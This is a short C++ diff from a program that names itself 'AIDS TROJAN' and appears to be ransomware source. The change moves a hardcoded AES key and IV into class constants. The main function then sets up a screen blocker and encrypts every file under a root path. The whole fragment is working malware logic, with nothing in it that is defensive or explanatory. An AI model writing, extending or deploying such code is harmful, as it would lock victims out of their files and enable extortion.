@@ -10,11 +10,9 @@ using namespace std::filesystem;
 
 int main (){
     cout << "****************** AIDS TROJAN ******************" << endl;
-    string key = "123456789ABCDEF123456789ABCDEF";
-    string iv = "112233445566778899AABBCCDDEEFF";
 
     ScreenBlocker screenBlocker;
-    EncryptorService* encryptorService = new AESEncryptor(key, iv);
+    EncryptorService* encryptorService = new AESEncryptor(AESEncryptor::KEY, AESEncryptor::IV);
 
     encryptorService->encryptFilesIn(encryptorService->getRootPath());
 
